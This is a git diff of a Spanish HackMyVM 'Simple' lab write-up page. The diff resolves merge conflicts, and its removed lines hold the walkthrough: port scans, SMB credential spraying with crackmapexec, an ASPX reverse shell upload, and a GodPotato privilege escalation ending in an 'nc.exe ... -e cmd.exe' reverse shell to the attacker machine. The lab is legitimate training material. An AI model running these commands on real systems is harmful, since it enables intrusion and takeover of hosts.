@@ -18,11 +18,8 @@
 <meta property="og:locale" content="es" />
 <meta name="language" content="es" />
 
-<<<<<<< HEAD
   <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/hmv/simple/" title="" />
 
-=======
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 
 
   <meta itemprop="image" content="https://0x-noname.github.io/machines/hmv/simple/simple_logo.webp" />
@@ -36,10 +33,6 @@
     
     
     
-<<<<<<< HEAD
-=======
-    
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 
     <meta property="og:type" content="article" />
     <meta property="og:article:published_time" content=2023-10-16T20:30:08&#43;0200 />
@@ -76,20 +69,12 @@
 
 
 
-<<<<<<< HEAD
 <meta name="generator" content="Hugo 0.125.7">
-=======
-<meta name="generator" content="Hugo 0.111.3">
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 
     
 
     <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/simple/">
-<<<<<<< HEAD
     <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
-=======
-    <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -112,7 +97,6 @@
     <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
 
     
-<<<<<<< HEAD
     
   
 
@@ -121,22 +105,13 @@
 
 <script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
 
-=======
-    </head>
-<body data-theme = "" class="notransition">
-<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 <div class="navbar" role="navigation">
     <nav class="menu" aria-label="Main Navigation">
         <a href="https://0x-noname.github.io/" class="logo">
             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
 viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
 stroke-linejoin="round" class="feather feather-home">
-<<<<<<< HEAD
 <title></title>
-=======
-<title>Home</title>
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
 <polyline points="9 22 9 12 15 12 15 22"></polyline>
 </svg>
@@ -190,11 +165,8 @@ stroke-linejoin="round" class="feather feather-home">
                 <li class="menu-separator">
                     <span>|</span>
                 </li>
-<<<<<<< HEAD
                 
                 
-=======
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
             </ul>
             <a id="mode" href="#">
                 <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
@@ -212,7 +184,6 @@ stroke-linejoin="round" class="feather feather-home">
             <header class="header">
                 <h1 class="header-title">HackMyVM - Simple</h1>
                 
-<<<<<<< HEAD
                 
                 <div class="post-meta">
                     <time datetime="2023-10-16T20:30:08&#43;02:00" itemprop="datePublished"> Oct 16, 2023 </time>
@@ -221,19 +192,12 @@ stroke-linejoin="round" class="feather feather-home">
             </header>
             
             <div class="page-content">
-=======
-                <div class="post-meta">
-                    <time datetime="2023-10-16T20:30:08&#43;02:00" itemprop="datePublished"> Oct 16, 2023 </time>
-                </div>
-            </header><div class="page-content">
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
                 <p><img src="/../machines/hmv/simple/simple_logo.webp" alt="logo"></p>
 <ul>
 <li><em>Brute Force SMB - CrackMapExec</em></li>
 <li><em>SeImpersonatePrivilege - GodPotato - Privesc</em></li>
 </ul>
 <h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
-<<<<<<< HEAD
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -n -v -Pn 192.168.1.12
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT      STATE SERVICE
@@ -358,137 +322,10 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">c:\windows\system32\inetsrv&gt;
 </span></span></code></pre></div><p>Con <code>whoami /priv</code> obtengo los privilegios del usuario actual y veo que tengo habilitado el privilegio <code>SeImpersonatePrivilege</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">PS C:\Users\Public&gt; whoami /priv
-=======
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -p- -T5 -n -v -Pn 192.168.1.12
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
-</span></span><span style="display:flex;"><span>80/tcp    open  http
-</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
-</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
-</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
-</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
-</span></span><span style="display:flex;"><span>47001/tcp open  winrm
-</span></span><span style="display:flex;"><span>49664/tcp open  unknown
-</span></span><span style="display:flex;"><span>49665/tcp open  unknown
-</span></span><span style="display:flex;"><span>49666/tcp open  unknown
-</span></span><span style="display:flex;"><span>49667/tcp open  unknown
-</span></span><span style="display:flex;"><span>49668/tcp open  unknown
-</span></span><span style="display:flex;"><span>49671/tcp open  unknown
-</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -sVC -v -Pn -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49671 192.168.1.12
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
-</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
-</span></span><span style="display:flex;"><span>| http-methods: 
-</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
-</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
-</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
-</span></span><span style="display:flex;"><span>|_http-title: Simple
-</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
-</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
-</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
-</span></span><span style="display:flex;"><span>|_http-title: Not Found
-</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
-</span></span><span style="display:flex;"><span>|_http-title: Not Found
-</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span style="display:flex;"><span>49671/tcp open  msrpc         Microsoft Windows RPC
-</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Host script results:
-</span></span><span style="display:flex;"><span>|_clock-skew: 1s
-</span></span><span style="display:flex;"><span>| smb2-time: 
-</span></span><span style="display:flex;"><span>|   date: 2023-10-13T12:02:21
-</span></span><span style="display:flex;"><span>|_  start_date: N/A
-</span></span><span style="display:flex;"><span>| nbstat: NetBIOS name: SIMPLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:18:44:b2 (Oracle VirtualBox virtual NIC)
-</span></span><span style="display:flex;"><span>| Names:
-</span></span><span style="display:flex;"><span>|   SIMPLE&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
-</span></span><span style="display:flex;"><span>|   SIMPLE&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
-</span></span><span style="display:flex;"><span>|_  WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
-</span></span><span style="display:flex;"><span>| smb2-security-mode: 
-</span></span><span style="display:flex;"><span>|   3:1:1: 
-</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
-</span></span></code></pre></div><h3 id="http-tcp---80">HTTP TCP - 80</h3>
-<p><img src="/../machines/hmv/simple/http.webp" alt="http.png"></p>
-<p>Creo el archivo <code>users.txt</code> con los nombres de la web encontrados.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>ruy
-</span></span><span style="display:flex;"><span>marcos
-</span></span><span style="display:flex;"><span>lander
-</span></span><span style="display:flex;"><span>bogo
-</span></span><span style="display:flex;"><span>vaiper
-</span></span></code></pre></div><p>Lanzo <strong>crackmapexec</strong> con la flag <code>--no-bruteforce</code> esta flag <em>compara la primera línea de un diccionario con la primera línea de otro diccionario</em> y así hasta terminar de leer los dos diccionarios.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ crackmapexec smb 192.168.1.12 -u &#39;users.txt&#39; -p &#39;users.txt&#39; --no-bruteforce
-</span></span></code></pre></div><p><img src="/../machines/hmv/simple/cmebogo.webp" alt="cmebogo"></p>
-<p>Con la flag <code>--shares</code> puedo ver que recursos comparte el usuario bogo.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ crackmapexec smb 192.168.1.12 -u &#39;bogo&#39; -p &#39;bogo&#39; --shares
-</span></span></code></pre></div><p><img src="/../machines/hmv/simple/cmebogoshares.webp" alt="cmebogoshares"></p>
-<p>Me conecto al recurso <strong>LOGS</strong> y me descargo el archivo <code>20231008.log</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ smbclient \\\\192.168.1.12\\LOGS -U bogo
-</span></span><span style="display:flex;"><span>Password for [WORKGROUP\bogo]:
-</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
-</span></span><span style="display:flex;"><span>smb: \&gt; ls
-</span></span><span style="display:flex;"><span>  .                                   D        0  Sun Oct  8 23:23:36 2023
-</span></span><span style="display:flex;"><span>  ..                                  D        0  Sun Oct  8 23:23:36 2023
-</span></span><span style="display:flex;"><span>  20231008.log                        A     2200  Sun Oct  8 23:23:36 2023
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		12966143 blocks of size 4096. 11186735 blocks available
-</span></span><span style="display:flex;"><span>smb: \&gt; 
-</span></span></code></pre></div><p>Mirando el contenido del log encuentro las credenciales del usuario <strong>marcos</strong>.</p>
-<p><img src="/../machines/hmv/simple/log.webp" alt="log"></p>
-<p>Revisando los recursos del usuario <strong>marcos</strong> veo que el recurso <strong>WEB</strong> tiene permisos de lectura y escritura.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ crackmapexec smb 192.168.1.12 -u &#39;marcos&#39; -p &#39;SuperPassword&#39; --shares
-</span></span></code></pre></div><p><img src="/../machines/hmv/simple/cmemarcosshare.webp" alt="cmemarcosshare"></p>
-<p>Me conecto al recurso <strong>WEB</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ smbclient \\\\192.168.1.12\\WEB -U marcos
-</span></span><span style="display:flex;"><span>Password for [WORKGROUP\marcos]:
-</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
-</span></span><span style="display:flex;"><span>smb: \&gt; ls
-</span></span><span style="display:flex;"><span>  .                                   D        0  Fri Oct 13 17:55:50 2023
-</span></span><span style="display:flex;"><span>  ..                                  D        0  Fri Oct 13 17:55:50 2023
-</span></span><span style="display:flex;"><span>  03-comming-soon                     D        0  Fri Oct 13 17:34:10 2023
-</span></span><span style="display:flex;"><span>  aspnet_client                       D        0  Sun Oct  8 21:46:18 2023
-</span></span><span style="display:flex;"><span>  common-js                           D        0  Sun Oct  8 23:14:09 2023
-</span></span><span style="display:flex;"><span>  fonts                               D        0  Sun Oct  8 23:14:09 2023
-</span></span><span style="display:flex;"><span>  images                              D        0  Sun Oct  8 23:14:09 2023
-</span></span><span style="display:flex;"><span>  index.html                          A     1481  Sun Oct  8 23:26:47 2023
-</span></span></code></pre></div><p>Subo esta <a href="https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx">shell</a> apuntando a mi máquina atacante.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>smb: \&gt; put rs.aspx
-</span></span><span style="display:flex;"><span>putting file rs.aspx as \rs.aspx (866,4 kb/s) (average 866,4 kb/s)
-</span></span><span style="display:flex;"><span>smb: \&gt; ls
-</span></span><span style="display:flex;"><span>  .                                   D        0  Fri Oct 13 18:01:46 2023
-</span></span><span style="display:flex;"><span>  ..                                  D        0  Fri Oct 13 18:01:46 2023
-</span></span><span style="display:flex;"><span>  03-comming-soon                     D        0  Fri Oct 13 17:34:10 2023
-</span></span><span style="display:flex;"><span>  aspnet_client                       D        0  Sun Oct  8 21:46:18 2023
-</span></span><span style="display:flex;"><span>  common-js                           D        0  Sun Oct  8 23:14:09 2023
-</span></span><span style="display:flex;"><span>  fonts                               D        0  Sun Oct  8 23:14:09 2023
-</span></span><span style="display:flex;"><span>  images                              D        0  Sun Oct  8 23:14:09 2023
-</span></span><span style="display:flex;"><span>  index.html                          A     1481  Sun Oct  8 23:26:47 2023
-</span></span><span style="display:flex;"><span>  rs.aspx                             A    15970  Fri Oct 13 18:01:46 2023
-</span></span></code></pre></div><p>Lanzo una petición al archivo <strong>rs.aspx</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl http://192.168.1.12/rs.aspx
-</span></span></code></pre></div><p>Y obtengo la shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ rlwrap nc -lvp 443
-</span></span><span style="display:flex;"><span>listening on [any] 443 ...
-</span></span><span style="display:flex;"><span>connect to [192.168.1.17] from simple [192.168.1.12] 49687
-</span></span><span style="display:flex;"><span>Spawn Shell...
-</span></span><span style="display:flex;"><span>Microsoft Windows [Versin 10.0.17763.107]
-</span></span><span style="display:flex;"><span>(c) 2018 Microsoft Corporation. Todos los derechos reservados.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>c:\windows\system32\inetsrv&gt;
-</span></span></code></pre></div><p>Con <code>whoami /priv</code> obtengo los privilegios del usuario actual y veo que tengo habilitado el privilegio <code>SeImpersonatePrivilege</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>PS C:\Users\Public&gt; whoami /priv
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </span></span></code></pre></div><p><img src="/../machines/hmv/simple/whoamipriv.webp" alt="whoamipriv"></p>
 <p>Subo <a href="https://github.com/BeichenDream/GodPotato/releases">GodPotato</a>  y <code>nc.exe</code> a la máquina victima.</p>
 <p><img src="/../machines/hmv/simple/privescexes.webp" alt="privescexes"></p>
 <p>Ejecuto <strong>GodPotato</strong> con el comando <strong>whoami</strong> y veo que soy <code>NT AUTHORITY\SYSTEM</code>.</p>
-<<<<<<< HEAD
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">C:\Users\Public&gt;GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">[*] CombaseModule: 0x140711168049152
@@ -557,76 +394,6 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">nt authority\system
 </span></span></code></pre></div><p>Buscar las flags.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">C:\Users&gt;dir /r /s user.txt root.txt
-=======
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>C:\Users\Public&gt;GodPotato-NET4.exe -cmd &#34;cmd /c whoami&#34;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>[*] CombaseModule: 0x140711168049152
-</span></span><span style="display:flex;"><span>[*] DispatchTable: 0x140711170366704
-</span></span><span style="display:flex;"><span>[*] UseProtseqFunction: 0x140711169741984
-</span></span><span style="display:flex;"><span>[*] UseProtseqFunctionParamCount: 6
-</span></span><span style="display:flex;"><span>[*] HookRPC
-</span></span><span style="display:flex;"><span>[*] Start PipeServer
-</span></span><span style="display:flex;"><span>[*] CreateNamedPipe \\.\pipe\3da0c7ef-cd10-40e6-acad-658e7fc73399\pipe\epmapper
-</span></span><span style="display:flex;"><span>[*] Trigger RPCSS
-</span></span><span style="display:flex;"><span>[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
-</span></span><span style="display:flex;"><span>[*] DCOM obj IPID: 00008802-0a94-ffff-5bee-58066d46a048
-</span></span><span style="display:flex;"><span>[*] DCOM obj OXID: 0x9778536405ac32d2
-</span></span><span style="display:flex;"><span>[*] DCOM obj OID: 0x631fbab1194c49c8
-</span></span><span style="display:flex;"><span>[*] DCOM obj Flags: 0x281
-</span></span><span style="display:flex;"><span>[*] DCOM obj PublicRefs: 0x0
-</span></span><span style="display:flex;"><span>[*] Marshal Object bytes len: 100
-</span></span><span style="display:flex;"><span>[*] UnMarshal Object
-</span></span><span style="display:flex;"><span>[*] Pipe Connected!
-</span></span><span style="display:flex;"><span>[*] CurrentUser: NT AUTHORITY\Servicio de red
-</span></span><span style="display:flex;"><span>[*] CurrentsImpersonationLevel: Impersonation
-</span></span><span style="display:flex;"><span>[*] Start Search System Token
-</span></span><span style="display:flex;"><span>[*] PID : 740 Token:0x612  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
-</span></span><span style="display:flex;"><span>[*] Find System Token : True
-</span></span><span style="display:flex;"><span>[*] UnmarshalObject: 0x80070776
-</span></span><span style="display:flex;"><span>[*] CurrentUser: NT AUTHORITY\SYSTEM
-</span></span><span style="display:flex;"><span>[*] process start with pid 2272
-</span></span><span style="display:flex;"><span>nt authority\system
-</span></span></code></pre></div><p>Ahora solo queda mandarme una shell para obtener el <code>nt authority\system</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>C:\Users\Public&gt;GodPotato-NET4.exe -cmd &#34;cmd /c nc.exe 192.168.1.17 1234 -e cmd.exe&#34;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>[*] CombaseModule: 0x140711168049152
-</span></span><span style="display:flex;"><span>[*] DispatchTable: 0x140711170366704
-</span></span><span style="display:flex;"><span>[*] UseProtseqFunction: 0x140711169741984
-</span></span><span style="display:flex;"><span>[*] UseProtseqFunctionParamCount: 6
-</span></span><span style="display:flex;"><span>[*] HookRPC
-</span></span><span style="display:flex;"><span>[*] Start PipeServer
-</span></span><span style="display:flex;"><span>[*] CreateNamedPipe \\.\pipe\c566574c-c19c-4dd5-8960-6cc7db2e1c78\pipe\epmapper
-</span></span><span style="display:flex;"><span>[*] Trigger RPCSS
-</span></span><span style="display:flex;"><span>[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
-</span></span><span style="display:flex;"><span>[*] DCOM obj IPID: 00009402-02a0-ffff-56f2-6c2e223d5d4c
-</span></span><span style="display:flex;"><span>[*] DCOM obj OXID: 0x4764d0edbadc0419
-</span></span><span style="display:flex;"><span>[*] DCOM obj OID: 0x4bc0d6dcbc6859ff
-</span></span><span style="display:flex;"><span>[*] DCOM obj Flags: 0x281
-</span></span><span style="display:flex;"><span>[*] DCOM obj PublicRefs: 0x0
-</span></span><span style="display:flex;"><span>[*] Marshal Object bytes len: 100
-</span></span><span style="display:flex;"><span>[*] UnMarshal Object
-</span></span><span style="display:flex;"><span>[*] Pipe Connected!
-</span></span><span style="display:flex;"><span>[*] CurrentUser: NT AUTHORITY\Servicio de red
-</span></span><span style="display:flex;"><span>[*] CurrentsImpersonationLevel: Impersonation
-</span></span><span style="display:flex;"><span>[*] Start Search System Token
-</span></span><span style="display:flex;"><span>[*] PID : 740 Token:0x612  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
-</span></span><span style="display:flex;"><span>[*] Find System Token : True
-</span></span><span style="display:flex;"><span>[*] UnmarshalObject: 0x80070776
-</span></span><span style="display:flex;"><span>[*] CurrentUser: NT AUTHORITY\SYSTEM
-</span></span><span style="display:flex;"><span>[*] process start with pid 2684
-</span></span></code></pre></div><p>Después de unos segundos obtengo la shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ rlwrap nc -lvp 1234
-</span></span><span style="display:flex;"><span>listening on [any] 1234 ...
-</span></span><span style="display:flex;"><span>connect to [192.168.1.17] from simple [192.168.1.12] 49701
-</span></span><span style="display:flex;"><span>Microsoft Windows [Versin 10.0.17763.107]
-</span></span><span style="display:flex;"><span>(c) 2018 Microsoft Corporation. Todos los derechos reservados.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:\Users\Public&gt;whoami
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>nt authority\system
-</span></span></code></pre></div><p>Buscar las flags.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>C:\Users&gt;dir /r /s user.txt root.txt
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </span></span></code></pre></div><p><img src="/../machines/hmv/simple/rutaflags.webp" alt="rutaflags"></p>
 <p>Y aquí termina la máquina Simple.</p>
 <blockquote>
@@ -635,12 +402,7 @@ stroke-linejoin="round" class="feather feather-home">
 <p>Saludos!</p>
 
             </div>
-<<<<<<< HEAD
         </article></main>
-=======
-        </article>
-    </main>
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </div>
 <footer class="footer">
     <span class="footer_item"> </span>
@@ -659,17 +421,9 @@ stroke-linejoin="round" class="feather feather-home">
 </div>
     <small class="footer_copyright">
         © 2024 .
-<<<<<<< HEAD
         
     </small>
 </footer><a href="#" title="" id="totop">
-=======
-        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
-        theme on
-        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
-    </small>
-</footer><a href="#" title="Go to top" id="totop">
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
     <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
     <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
 </svg>
@@ -678,7 +432,6 @@ stroke-linejoin="round" class="feather feather-home">
 
 
     
-<<<<<<< HEAD
 
 
 
@@ -691,12 +444,4 @@ stroke-linejoin="round" class="feather feather-home">
     
 
 </body>
-=======
-    
-    
-    <script src="https://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
-
-
-    </body>
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </html>
